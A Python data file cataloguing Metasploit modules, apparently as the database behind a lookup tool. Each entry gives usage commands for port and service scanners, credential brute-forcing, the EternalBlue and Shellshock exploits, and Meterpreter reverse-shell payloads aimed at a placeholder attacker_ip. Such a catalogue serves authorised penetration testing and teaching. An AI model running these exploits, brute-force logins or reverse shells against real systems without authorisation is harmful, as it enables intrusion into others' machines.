MODULES_DB = [
    # PORT SCANNING MODULES
    {
        "name": "TCP Port Scanner",
        "path": "auxiliary/scanner/portscan/tcp",
        "category": "Port Scanning",
        "description": "Basic TCP port scanner to identify open ports",
        "targets": ["Any", "Network"],
        "tags": ["tcp", "port", "scan", "network", "reconnaissance"],
        "usage": "use auxiliary/scanner/portscan/tcp\nset RHOSTS target_ip\nset PORTS 1-1000\nrun",
        "options": ["RHOSTS", "PORTS", "THREADS", "TIMEOUT"]
    },
    {
        "name": "SYN Port Scanner",
        "path": "auxiliary/scanner/portscan/syn",
        "category": "Port Scanning",
        "description": "Fast SYN port scanner for stealth scanning",
        "targets": ["Any", "Network"],
        "tags": ["syn", "port", "scan", "stealth", "fast"],
        "usage": "use auxiliary/scanner/portscan/syn\nset RHOSTS target_ip\nset PORTS 1-65535\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE", "SNAPLEN"]
    },
    {
        "name": "ACK Port Scanner",
        "path": "auxiliary/scanner/portscan/ack",
        "category": "Port Scanning",
        "description": "ACK port scanner to identify filtered ports and firewall rules",
        "targets": ["Any", "Network"],
        "tags": ["ack", "port", "scan", "firewall", "filtered"],
        "usage": "use auxiliary/scanner/portscan/ack\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE"]
    },
    {
        "name": "XMas Port Scanner",
        "path": "auxiliary/scanner/portscan/xmas",
        "category": "Port Scanning",
        "description": "TCP XMas port scanner (FIN, PSH, URG flags set)",
        "targets": ["Any", "Network"],
        "tags": ["xmas", "tcp", "port", "scan", "stealth", "fin", "psh", "urg"],
        "usage": "use auxiliary/scanner/portscan/xmas\nset RHOSTS target_ip\nset PORTS 1-1000\nrun",
        "options": ["RHOSTS", "PORTS", "INTERFACE", "SNAPLEN"]
    },
    {
        "name": "FTP Bounce Port Scanner",
        "path": "auxiliary/scanner/portscan/ftpbounce",
        "category": "Port Scanning",
        "description": "FTP bounce port scanner using FTP PORT command",
        "targets": ["FTP", "Network"],
        "tags": ["ftp", "bounce", "port", "scan", "proxy"],
        "usage": "use auxiliary/scanner/portscan/ftpbounce\nset BOUNCEHOST ftp_server\nset RHOSTS target_ip\nrun",
        "options": ["BOUNCEHOST", "RHOSTS", "BOUNCEPORT", "FTPUSER", "FTPPASS"]
    },
    {
        "name": "NAT-PMP Port Scanner",
        "path": "auxiliary/scanner/natpmp/natpmp_portscan",
        "category": "Port Scanning",
        "description": "NAT-PMP external port scanner for router enumeration",
        "targets": ["Router", "NAT-PMP", "Network"],
        "tags": ["natpmp", "router", "port", "scan", "nat", "upnp"],
        "usage": "use auxiliary/scanner/natpmp/natpmp_portscan\nset RHOSTS router_ip\nrun",
        "options": ["RHOSTS", "PORTS", "LIFETIME"]
    },
    {
        "name": "SAP Router Port Scanner",
        "path": "auxiliary/scanner/sap/sap_router_portscanner",
        "category": "Port Scanning",
        "description": "SAP Router port scanner for SAP systems",
        "targets": ["SAP", "Enterprise"],
        "tags": ["sap", "router", "port", "scan", "enterprise"],
        "usage": "use auxiliary/scanner/sap/sap_router_portscanner\nset RHOSTS sap_server\nrun",
        "options": ["RHOSTS", "RPORT", "PORTS"]
    },
    
    # SMB SCANNING MODULES
    {
        "name": "SMB Version Scanner",
        "path": "auxiliary/scanner/smb/smb_version",
        "category": "Service Scanning",
        "description": "Scan for SMB version information",
        "targets": ["Windows", "SMB", "Network"],
        "tags": ["smb", "version", "windows", "shares"],
        "usage": "use auxiliary/scanner/smb/smb_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain"]
    },
    {
        "name": "SMB MS17-010 Scanner",
        "path": "auxiliary/scanner/smb/smb_ms17_010",
        "category": "Vulnerability Scanning",
        "description": "Scan for MS17-010 EternalBlue vulnerability",
        "targets": ["Windows", "SMB"],
        "tags": ["ms17-010", "eternalblue", "smb", "vulnerability", "windows"],
        "usage": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "CHECK_ARCH", "CHECK_DOPU", "CHECK_PIPE"]
    },
    {
        "name": "SMB Share Scanner",
        "path": "auxiliary/scanner/smb/smb_enumshares",
        "category": "Service Scanning",
        "description": "Enumerate SMB shares on target systems",
        "targets": ["Windows", "SMB"],
        "tags": ["smb", "shares", "enumerate", "windows"],
        "usage": "use auxiliary/scanner/smb/smb_enumshares\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain", "LogSpider"]
    },
    
    # SSH SCANNING MODULES
    {
        "name": "SSH Version Scanner",
        "path": "auxiliary/scanner/ssh/ssh_version",
        "category": "Service Scanning",
        "description": "Scan for SSH version information",
        "targets": ["Linux", "SSH", "Network"],
        "tags": ["ssh", "version", "linux", "remote"],
        "usage": "use auxiliary/scanner/ssh/ssh_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TIMEOUT"]
    },
    {
        "name": "SSH Login Scanner",
        "path": "auxiliary/scanner/ssh/ssh_login",
        "category": "Brute Force",
        "description": "Brute force SSH login credentials",
        "targets": ["Linux", "SSH"],
        "tags": ["ssh", "brute", "login", "credentials", "password"],
        "usage": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS target_ip\nset USERNAME root\nset PASSWORD_FILE /path/to/passwords.txt\nrun",
        "options": ["RHOSTS", "USERNAME", "PASSWORD", "USERPASS_FILE", "USER_FILE", "PASS_FILE"]
    },
    
    # HTTP/WEB SCANNING MODULES
    {
        "name": "HTTP Version Scanner",
        "path": "auxiliary/scanner/http/http_version",
        "category": "Service Scanning",
        "description": "Scan for HTTP server version information",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "web", "version", "server"],
        "usage": "use auxiliary/scanner/http/http_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "VHOST", "SSL"]
    },
    {
        "name": "Directory Scanner",
        "path": "auxiliary/scanner/http/dir_scanner",
        "category": "Web Scanning",
        "description": "Scan for common directories on web servers",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "directory", "web", "enumeration"],
        "usage": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "PATH", "DICTIONARY"]
    },
    {
        "name": "Files and Directories Scanner",
        "path": "auxiliary/scanner/http/files_dir",
        "category": "Web Scanning",
        "description": "Scan for files and directories on web servers",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "files", "directories", "web"],
        "usage": "use auxiliary/scanner/http/files_dir\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "PATH", "EXT", "DICTIONARY"]
    },
    {
        "name": "HTTP Title Scanner",
        "path": "auxiliary/scanner/http/title",
        "category": "Web Scanning",
        "description": "Scan for HTTP page titles",
        "targets": ["Web", "HTTP"],
        "tags": ["http", "title", "web", "reconnaissance"],
        "usage": "use auxiliary/scanner/http/title\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "SSL"]
    },
    
    # FTP SCANNING MODULES
    {
        "name": "FTP Version Scanner",
        "path": "auxiliary/scanner/ftp/ftp_version",
        "category": "Service Scanning",
        "description": "Scan for FTP server version information",
        "targets": ["FTP", "Network"],
        "tags": ["ftp", "version", "server"],
        "usage": "use auxiliary/scanner/ftp/ftp_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    {
        "name": "Anonymous FTP Scanner",
        "path": "auxiliary/scanner/ftp/anonymous",
        "category": "Service Scanning",
        "description": "Check for anonymous FTP access",
        "targets": ["FTP"],
        "tags": ["ftp", "anonymous", "access"],
        "usage": "use auxiliary/scanner/ftp/anonymous\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "FTPUSER", "FTPPASS"]
    },
    
    # DNS SCANNING MODULES
    {
        "name": "DNS Enumeration",
        "path": "auxiliary/gather/dns_enum",
        "category": "Information Gathering",
        "description": "Enumerate DNS information for a domain",
        "targets": ["DNS", "Network"],
        "tags": ["dns", "enumeration", "domain", "subdomain"],
        "usage": "use auxiliary/gather/dns_enum\nset DOMAIN example.com\nrun",
        "options": ["DOMAIN", "NS", "ENUM_AXFR", "ENUM_TLD", "ENUM_SRV"]
    },
    
    # SNMP SCANNING MODULES
    {
        "name": "SNMP Enumeration",
        "path": "auxiliary/scanner/snmp/snmp_enum",
        "category": "Service Scanning",
        "description": "Enumerate SNMP information",
        "targets": ["SNMP", "Network"],
        "tags": ["snmp", "enumeration", "community"],
        "usage": "use auxiliary/scanner/snmp/snmp_enum\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "COMMUNITY", "VERSION"]
    },
    {
        "name": "SNMP Login Scanner",
        "path": "auxiliary/scanner/snmp/snmp_login",
        "category": "Brute Force",
        "description": "Brute force SNMP community strings",
        "targets": ["SNMP"],
        "tags": ["snmp", "brute", "community", "login"],
        "usage": "use auxiliary/scanner/snmp/snmp_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PASS_FILE", "VERSION"]
    },
    
    # DATABASE SCANNING MODULES
    {
        "name": "MySQL Version Scanner",
        "path": "auxiliary/scanner/mysql/mysql_version",
        "category": "Database Scanning",
        "description": "Scan for MySQL version information",
        "targets": ["MySQL", "Database"],
        "tags": ["mysql", "database", "version"],
        "usage": "use auxiliary/scanner/mysql/mysql_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    {
        "name": "MySQL Login Scanner",
        "path": "auxiliary/scanner/mysql/mysql_login",
        "category": "Database Scanning",
        "description": "Brute force MySQL login credentials",
        "targets": ["MySQL", "Database"],
        "tags": ["mysql", "database", "brute", "login"],
        "usage": "use auxiliary/scanner/mysql/mysql_login\nset RHOSTS target_ip\nset USERNAME root\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE"]
    },
    {
        "name": "MSSQL Login Scanner",
        "path": "auxiliary/scanner/mssql/mssql_login",
        "category": "Database Scanning",
        "description": "Brute force MSSQL login credentials",
        "targets": ["MSSQL", "Database", "Windows"],
        "tags": ["mssql", "database", "brute", "login", "windows"],
        "usage": "use auxiliary/scanner/mssql/mssql_login\nset RHOSTS target_ip\nset USERNAME sa\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE"]
    },
    
    # VULNERABILITY SCANNERS
    {
        "name": "OpenSSL Heartbleed Scanner",
        "path": "auxiliary/scanner/ssl/openssl_heartbleed",
        "category": "Vulnerability Scanning",
        "description": "Scan for OpenSSL Heartbleed vulnerability",
        "targets": ["SSL", "OpenSSL"],
        "tags": ["heartbleed", "ssl", "openssl", "vulnerability"],
        "usage": "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TLS_CALLBACK", "TLS_VERSION"]
    },
    {
        "name": "SSL Certificate Scanner",
        "path": "auxiliary/scanner/ssl/ssl_version",
        "category": "Service Scanning",
        "description": "Scan SSL/TLS version and certificate information",
        "targets": ["SSL", "TLS"],
        "tags": ["ssl", "tls", "certificate", "version"],
        "usage": "use auxiliary/scanner/ssl/ssl_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    
    # EXPLOITATION MODULES
    {
        "name": "EternalBlue Exploit",
        "path": "exploit/windows/smb/ms17_010_eternalblue",
        "category": "Exploitation",
        "description": "Exploit MS17-010 EternalBlue vulnerability",
        "targets": ["Windows", "SMB"],
        "tags": ["ms17-010", "eternalblue", "exploit", "windows"],
        "usage": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST attacker_ip\nrun",
        "options": ["RHOSTS", "RPORT", "GroomAllocations", "GroomDelta"]
    },
    {
        "name": "Shellshock Exploit",
        "path": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "category": "Exploitation",
        "description": "Exploit Shellshock vulnerability in CGI scripts",
        "targets": ["Linux", "Apache", "CGI"],
        "tags": ["shellshock", "bash", "cgi", "exploit"],
        "usage": "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target_ip\nset TARGETURI /cgi-bin/vulnerable.cgi\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "METHOD"]
    },
    
    # ADDITIONAL PORT SCANNING MODULES
    {
        "name": "WordPress Pingback Scanner",
        "path": "auxiliary/scanner/http/wordpress_pingback_access",
        "category": "Web Scanning",
        "description": "WordPress pingback locator for SSRF attacks",
        "targets": ["WordPress", "Web"],
        "tags": ["wordpress", "pingback", "ssrf", "web", "scan"],
        "usage": "use auxiliary/scanner/http/wordpress_pingback_access\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "THREADS"]
    },
    {
        "name": "UDP Port Scanner",
        "path": "auxiliary/scanner/discovery/udp_sweep",
        "category": "Port Scanning",
        "description": "UDP port scanner and service discovery",
        "targets": ["Any", "Network"],
        "tags": ["udp", "port", "scan", "discovery", "service"],
        "usage": "use auxiliary/scanner/discovery/udp_sweep\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "PORTS", "THREADS"]
    },
    {
        "name": "IPv6 Port Scanner",
        "path": "auxiliary/scanner/portscan/tcp6",
        "category": "Port Scanning",
        "description": "IPv6 TCP port scanner",
        "targets": ["IPv6", "Network"],
        "tags": ["ipv6", "tcp", "port", "scan"],
        "usage": "use auxiliary/scanner/portscan/tcp6\nset RHOSTS target_ipv6\nrun",
        "options": ["RHOSTS", "PORTS", "THREADS"]
    },

    # ADDITIONAL WEB SCANNING MODULES
    {
        "name": "Apache Tomcat Scanner",
        "path": "auxiliary/scanner/http/tomcat_mgr_login",
        "category": "Web Scanning",
        "description": "Apache Tomcat manager login scanner",
        "targets": ["Tomcat", "Web"],
        "tags": ["tomcat", "manager", "login", "web", "brute"],
        "usage": "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "USER_FILE", "PASS_FILE"]
    },
    {
        "name": "Jenkins Scanner",
        "path": "auxiliary/scanner/http/jenkins_enum",
        "category": "Web Scanning",
        "description": "Jenkins CI server enumeration",
        "targets": ["Jenkins", "Web"],
        "tags": ["jenkins", "ci", "enumeration", "web"],
        "usage": "use auxiliary/scanner/http/jenkins_enum\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },
    {
        "name": "Joomla Scanner",
        "path": "auxiliary/scanner/http/joomla_version",
        "category": "Web Scanning",
        "description": "Joomla CMS version scanner",
        "targets": ["Joomla", "Web"],
        "tags": ["joomla", "cms", "version", "web"],
        "usage": "use auxiliary/scanner/http/joomla_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },
    {
        "name": "Drupal Scanner",
        "path": "auxiliary/scanner/http/drupal_views_user_enum",
        "category": "Web Scanning",
        "description": "Drupal user enumeration via views",
        "targets": ["Drupal", "Web"],
        "tags": ["drupal", "user", "enumeration", "web"],
        "usage": "use auxiliary/scanner/http/drupal_views_user_enum\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },

    # ADDITIONAL DATABASE MODULES
    {
        "name": "PostgreSQL Scanner",
        "path": "auxiliary/scanner/postgres/postgres_version",
        "category": "Database Scanning",
        "description": "PostgreSQL version scanner",
        "targets": ["PostgreSQL", "Database"],
        "tags": ["postgresql", "postgres", "database", "version"],
        "usage": "use auxiliary/scanner/postgres/postgres_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "DATABASE"]
    },
    {
        "name": "Oracle Scanner",
        "path": "auxiliary/scanner/oracle/oracle_login",
        "category": "Database Scanning",
        "description": "Oracle database login scanner",
        "targets": ["Oracle", "Database"],
        "tags": ["oracle", "database", "login", "brute"],
        "usage": "use auxiliary/scanner/oracle/oracle_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "SID"]
    },
    {
        "name": "MongoDB Scanner",
        "path": "auxiliary/scanner/mongodb/mongodb_login",
        "category": "Database Scanning",
        "description": "MongoDB login scanner",
        "targets": ["MongoDB", "Database"],
        "tags": ["mongodb", "database", "login", "nosql"],
        "usage": "use auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD"]
    },

    # ADDITIONAL VULNERABILITY SCANNERS
    {
        "name": "Shellshock Scanner",
        "path": "auxiliary/scanner/http/apache_mod_cgi_bash_env",
        "category": "Vulnerability Scanning",
        "description": "Shellshock (CVE-2014-6271) vulnerability scanner",
        "targets": ["Linux", "Apache", "CGI"],
        "tags": ["shellshock", "bash", "cve-2014-6271", "vulnerability"],
        "usage": "use auxiliary/scanner/http/apache_mod_cgi_bash_env\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },
    {
        "name": "Struts2 Scanner",
        "path": "auxiliary/scanner/http/struts2_code_exec_scanner",
        "category": "Vulnerability Scanning",
        "description": "Apache Struts2 code execution scanner",
        "targets": ["Struts2", "Java", "Web"],
        "tags": ["struts2", "java", "code execution", "vulnerability"],
        "usage": "use auxiliary/scanner/http/struts2_code_exec_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },
    {
        "name": "Log4j Scanner",
        "path": "auxiliary/scanner/http/log4shell_scanner",
        "category": "Vulnerability Scanning",
        "description": "Log4Shell (CVE-2021-44228) vulnerability scanner",
        "targets": ["Java", "Log4j"],
        "tags": ["log4shell", "log4j", "cve-2021-44228", "java", "vulnerability"],
        "usage": "use auxiliary/scanner/http/log4shell_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI"]
    },

    # ADDITIONAL NETWORK SERVICES
    {
        "name": "Telnet Scanner",
        "path": "auxiliary/scanner/telnet/telnet_version",
        "category": "Service Scanning",
        "description": "Telnet service version scanner",
        "targets": ["Telnet", "Network"],
        "tags": ["telnet", "version", "service"],
        "usage": "use auxiliary/scanner/telnet/telnet_version\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TIMEOUT"]
    },
    {
        "name": "RDP Scanner",
        "path": "auxiliary/scanner/rdp/rdp_scanner",
        "category": "Service Scanning",
        "description": "Remote Desktop Protocol scanner",
        "targets": ["Windows", "RDP"],
        "tags": ["rdp", "remote desktop", "windows", "scanner"],
        "usage": "use auxiliary/scanner/rdp/rdp_scanner\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },
    {
        "name": "VNC Scanner",
        "path": "auxiliary/scanner/vnc/vnc_none_auth",
        "category": "Service Scanning",
        "description": "VNC authentication scanner",
        "targets": ["VNC", "Remote"],
        "tags": ["vnc", "authentication", "remote", "scanner"],
        "usage": "use auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT"]
    },

    # PAYLOADS
    {
        "name": "Windows Meterpreter Reverse TCP",
        "path": "payload/windows/meterpreter/reverse_tcp",
        "category": "Payloads",
        "description": "Windows Meterpreter reverse TCP payload",
        "targets": ["Windows"],
        "tags": ["meterpreter", "windows", "reverse", "tcp", "payload"],
        "usage": "set payload windows/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT", "EXITFUNC"]
    },
    {
        "name": "Linux Meterpreter Reverse TCP",
        "path": "payload/linux/x86/meterpreter/reverse_tcp",
        "category": "Payloads",
        "description": "Linux Meterpreter reverse TCP payload",
        "targets": ["Linux"],
        "tags": ["meterpreter", "linux", "reverse", "tcp", "payload"],
        "usage": "set payload linux/x86/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT"]
    },
    {
        "name": "Windows Shell Reverse TCP",
        "path": "payload/windows/shell/reverse_tcp",
        "category": "Payloads",
        "description": "Windows command shell reverse TCP payload",
        "targets": ["Windows"],
        "tags": ["shell", "windows", "reverse", "tcp", "payload"],
        "usage": "set payload windows/shell/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT"]
    },
    {
        "name": "PHP Meterpreter Reverse TCP",
        "path": "payload/php/meterpreter/reverse_tcp",
        "category": "Payloads",
        "description": "PHP Meterpreter reverse TCP payload",
        "targets": ["PHP", "Web"],
        "tags": ["php", "meterpreter", "reverse", "tcp", "web"],
        "usage": "set payload php/meterpreter/reverse_tcp\nset LHOST attacker_ip\nset LPORT 4444",
        "options": ["LHOST", "LPORT"]
    }
]
